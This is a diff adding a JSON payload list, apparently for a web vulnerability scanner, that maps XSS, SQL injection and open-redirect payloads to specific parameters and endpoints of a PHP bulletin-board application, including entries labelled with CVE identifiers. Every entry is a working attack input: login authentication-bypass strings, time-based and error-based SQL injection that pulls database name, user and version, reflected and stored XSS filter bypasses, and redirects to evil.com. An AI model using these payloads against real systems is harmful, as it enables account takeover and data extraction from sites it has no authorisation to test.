@@ -1,0 +1,243 @@
+{
+  "xss_board_stx": {
+    "xss_search": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",      "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",       "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",        "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout",    "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",       "payload": "\" onmouseover=alert(1) x=\""},
+      {"type": "REFLECTED_XSS", "family": "details_toggle",    "payload": "<details open ontoggle=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "backtick",          "payload": "\"><img src=x onerror=alert`1`>"},
+      {"type": "REFLECTED_XSS", "family": "entity_bypass",     "payload": "\" onmouseover&#61;alert(1) x=\""},
+      {"type": "REFLECTED_XSS", "family": "eval_fromcharcode", "payload": "\"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"}
+    ]
+  },
+
+  "sqli_board_stx": {
+    "sqli_string": [
+      {"type": "SQLI_STRING", "family": "quote_error",      "payload": "'1'='1"},
+      {"type": "SQLI_STRING", "family": "quote_tautology",  "payload": "' OR '1'='1"},
+      {"type": "SQLI_STRING", "family": "quote_comment",    "payload": "' OR 1=1-- -"},
+      {"type": "SQLI_STRING", "family": "time_sleep",       "payload": "' AND SLEEP(5)-- -"},
+      {"type": "SQLI_STRING", "family": "time_if",          "payload": "' AND IF(1=1,SLEEP(5),0)-- -"},
+      {"type": "SQLI_STRING", "family": "error_extract",    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_STRING", "family": "error_update",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
+      {"type": "SQLI_STRING", "family": "error_gtid",       "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -"},
+      {"type": "SQLI_STRING", "family": "union_probe",      "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
+      {"type": "SQLI_STRING", "family": "boolean_blind",    "payload": "' AND (SELECT 1 FROM information_schema.tables LIMIT 1)='1"},
+      {"type": "SQLI_STRING", "family": "percent_tautology","payload": "%' OR '1'='1"},
+      {"type": "SQLI_STRING", "family": "percent_sleep",    "payload": "%' AND SLEEP(5)-- -"}
+    ]
+  },
+
+  "sqli_search_stx_fix": {
+    "sqli_string": [
+      {"type": "SQLI_STRING", "family": "quote_error",      "payload": "'1'='1"},
+      {"type": "SQLI_STRING", "family": "quote_tautology",  "payload": "' OR '1'='1"},
+      {"type": "SQLI_STRING", "family": "time_sleep",       "payload": "' AND SLEEP(5)-- -"},
+      {"type": "SQLI_STRING", "family": "error_extract",    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_STRING", "family": "error_update",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
+      {"type": "SQLI_STRING", "family": "error_gtid",       "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -"},
+      {"type": "SQLI_STRING", "family": "union_cols",       "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
+      {"type": "SQLI_STRING", "family": "error_user",       "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"},
+      {"type": "SQLI_STRING", "family": "error_version",    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"}
+    ]
+  },
+
+  "sqli_faq_stx": {
+    "sqli_string": [
+      {"type": "SQLI_STRING", "family": "quote_error",      "payload": "'1'='1"},
+      {"type": "SQLI_STRING", "family": "quote_tautology",  "payload": "' OR '1'='1"},
+      {"type": "SQLI_STRING", "family": "time_sleep",       "payload": "' AND SLEEP(5)-- -"},
+      {"type": "SQLI_STRING", "family": "error_extract",    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_STRING", "family": "error_update",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
+      {"type": "SQLI_STRING", "family": "error_gtid",       "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -"},
+      {"type": "SQLI_STRING", "family": "union_probe",      "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
+      {"type": "SQLI_STRING", "family": "error_user",       "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"}
+    ]
+  },
+
+  "xss_faq_stx": {
+    "xss_search": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "xss_write_subject_bypass": {
+    "xss_stored": [
+      {"type": "STORED_XSS", "family": "css_animation",      "payload": "<style>*{animation-name:x}</style><b onanimationstart=alert(1)>test</b>"},
+      {"type": "STORED_XSS", "family": "onmouseenter",       "payload": "<b onmouseenter=alert(1)>hover me</b>"},
+      {"type": "STORED_XSS", "family": "onpointerover",      "payload": "<b onpointerover=alert(1)>hover</b>"},
+      {"type": "STORED_XSS", "family": "img_entity_onerror", "payload": "<img src=x onerror&#61;alert(1)>"},
+      {"type": "STORED_XSS", "family": "img_backtick",       "payload": "<img src=x onerror=alert`1`>"},
+      {"type": "STORED_XSS", "family": "svg_onload",         "payload": "<svg/onload=alert(1)>"},
+      {"type": "STORED_XSS", "family": "video_onerror",      "payload": "<video><source onerror=alert(1)></video>"}
+    ]
+  },
+
+  "xss_write_content_bypass": {
+    "xss_stored": [
+      {"type": "STORED_XSS", "family": "a_onmouseenter",     "payload": "<a href=# onmouseenter=alert(1)>hover</a>"},
+      {"type": "STORED_XSS", "family": "img_onmouseenter",   "payload": "<img src=x onmouseenter=alert(1)>"},
+      {"type": "STORED_XSS", "family": "img_onpointerover",  "payload": "<img src=x onpointerover=alert(1)>"},
+      {"type": "STORED_XSS", "family": "css_animation",      "payload": "<style>*{animation-name:x}</style><p onanimationstart=alert(1)>test</p>"},
+      {"type": "STORED_XSS", "family": "img_entity_onerror", "payload": "<img src=x onerror&#61;alert(1)>"},
+      {"type": "STORED_XSS", "family": "img_backtick",       "payload": "<img src=x onerror=alert`1`>"},
+      {"type": "STORED_XSS", "family": "details_toggle",     "payload": "<details open ontoggle=alert(1)>test</details>"},
+      {"type": "STORED_XSS", "family": "video_onerror",      "payload": "<video><source onerror=alert(1)></video>"}
+    ]
+  },
+
+  "sqli_board_sfl": {
+    "sqli_field": [
+      {"type": "SQLI_FIELD", "family": "time_if_sleep",     "payload": "IF(1=1,SLEEP(5),wr_datetime)"},
+      {"type": "SQLI_FIELD", "family": "time_and_sleep",    "payload": "wr_subject AND SLEEP(5) OR wr_subject"},
+      {"type": "SQLI_FIELD", "family": "error_extractvalue","payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
+      {"type": "SQLI_FIELD", "family": "error_updatexml",   "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)"},
+      {"type": "SQLI_FIELD", "family": "boolean_subquery",  "payload": "wr_subject AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1"},
+      {"type": "SQLI_FIELD", "family": "stacked_sleep",     "payload": "1 AND (SELECT SLEEP(5))=0 AND 1"},
+      {"type": "SQLI_FIELD", "family": "subquery_if",       "payload": "(SELECT IF(1=1,SLEEP(5),0))"},
+      {"type": "SQLI_FIELD", "family": "gtid_error",        "payload": "GTID_SUBSET(CONCAT(0x7e,database()),0)"}
+    ]
+  },
+
+  "sqli_board_sst": {
+    "sqli_orderby": [
+      {"type": "SQLI_ORDERBY", "family": "sleep_basic",     "payload": "(SELECT SLEEP(5))"},
+      {"type": "SQLI_ORDERBY", "family": "sleep_append",    "payload": "wr_datetime,(SELECT SLEEP(5))"},
+      {"type": "SQLI_ORDERBY", "family": "sleep_if",        "payload": "IF(1=1,SLEEP(5),wr_datetime)"},
+      {"type": "SQLI_ORDERBY", "family": "case_bool",       "payload": "CASE WHEN (1=1) THEN wr_datetime ELSE wr_num END"},
+      {"type": "SQLI_ORDERBY", "family": "case_blind",      "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN wr_datetime ELSE wr_num END"},
+      {"type": "SQLI_ORDERBY", "family": "error_extract",   "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
+      {"type": "SQLI_ORDERBY", "family": "error_update",    "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)"},
+      {"type": "SQLI_ORDERBY", "family": "sleep_subquery",  "payload": "(SELECT 1 FROM (SELECT SLEEP(3))x)"}
+    ]
+  },
+
+  "sqli_ajax_member": {
+    "sqli_login": [
+      {"type": "SQLI_LOGIN", "family": "auth_bypass",       "payload": "admin'-- -"},
+      {"type": "SQLI_LOGIN", "family": "tautology",         "payload": "' OR '1'='1'-- -"},
+      {"type": "SQLI_LOGIN", "family": "or_bypass",         "payload": "admin' OR 1=1-- -"},
+      {"type": "SQLI_LOGIN", "family": "time_blind",        "payload": "admin' AND SLEEP(5)-- -"},
+      {"type": "SQLI_LOGIN", "family": "error_extract",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_LOGIN", "family": "tautology_simple",  "payload": "' OR '1'='1"},
+      {"type": "SQLI_LOGIN", "family": "any_tautology",     "payload": "anything' OR 'x'='x"}
+    ]
+  },
+
+  "xss_move_from_bo": {
+    "xss_move": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "xss_move_wr_id": {
+    "xss_move": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "xss_password_url": {
+    "xss_url": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""},
+      {"type": "REFLECTED_XSS", "family": "javascript_uri", "payload": "javascript:alert(document.domain)"},
+      {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"}
+    ]
+  },
+
+  "xss_profile_mb": {
+    "xss_search": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "sqli_profile_mb": {
+    "sqli_string": [
+      {"type": "SQLI_STRING", "family": "auth_bypass",      "payload": "admin'-- -"},
+      {"type": "SQLI_STRING", "family": "tautology",        "payload": "' OR '1'='1"},
+      {"type": "SQLI_STRING", "family": "time_sleep",       "payload": "' AND SLEEP(5)-- -"},
+      {"type": "SQLI_STRING", "family": "error_extract",    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+      {"type": "SQLI_STRING", "family": "error_update",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"}
+    ]
+  },
+
+  "xss_register_name": {
+    "xss_search": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "open_redirect_login": {
+    "xss_url": [
+      {"type": "OPEN_REDIRECT", "family": "external_http",  "payload": "http://evil.com"},
+      {"type": "OPEN_REDIRECT", "family": "external_https", "payload": "https://evil.com"},
+      {"type": "OPEN_REDIRECT", "family": "protocol_rel",   "payload": "//evil.com"},
+      {"type": "OPEN_REDIRECT", "family": "backslash",      "payload": "\\\\evil.com"},
+      {"type": "OPEN_REDIRECT", "family": "encoded_slash",  "payload": "%2F%2Fevil.com"},
+      {"type": "OPEN_REDIRECT", "family": "javascript",     "payload": "javascript:alert(document.domain)"}
+    ]
+  },
+
+  "cve_18662_install_sqli": {
+    "sqli_time": [
+      {"type": "SQLI_TIME", "family": "poc_original",       "payload": "12'; select sleep(5)#"},
+      {"type": "SQLI_TIME", "family": "sleep_dash",         "payload": "test_'; SELECT SLEEP(5)-- -"},
+      {"type": "SQLI_TIME", "family": "sleep_or",           "payload": "a' OR SLEEP(5)#"},
+      {"type": "SQLI_TIME", "family": "if_sleep",           "payload": "x' AND IF(1=1,SLEEP(5),0)#"},
+      {"type": "SQLI_TIME", "family": "sleep_subquery",     "payload": "x'; SELECT IF(1=1,SLEEP(5),0)#"}
+    ],
+    "sqli_error": [
+      {"type": "SQLI_ERROR", "family": "extractvalue",      "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))#"},
+      {"type": "SQLI_ERROR", "family": "updatexml",         "payload": "x' AND UPDATEXML(1,CONCAT(0x7e,version()),1)#"},
+      {"type": "SQLI_ERROR", "family": "gtid_subset",       "payload": "x' AND GTID_SUBSET(CONCAT(0x7e,database()),0)#"},
+      {"type": "SQLI_ERROR", "family": "extractvalue_user", "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))#"}
+    ]
+  },
+
+  "cve_18661_login_xss": {
+    "xss_url": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "javascript_uri", "payload": "javascript:alert(document.domain)"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "onmouseover",    "payload": "\" onmouseover=alert(1) x=\""}
+    ]
+  },
+
+  "cve_18663_move_xss": {
+    "xss_move": [
+      {"type": "REFLECTED_XSS", "family": "script_basic",   "payload": "<script>alert(1)</script>"},
+      {"type": "REFLECTED_XSS", "family": "img_onerror",    "payload": "<img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "svg_onload",     "payload": "<svg onload=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "value_breakout", "payload": "\"><img src=x onerror=alert(1)>"},
+      {"type": "REFLECTED_XSS", "family": "details_toggle", "payload": "<details open ontoggle=alert(1)>"}
+    ]
+  }
+}
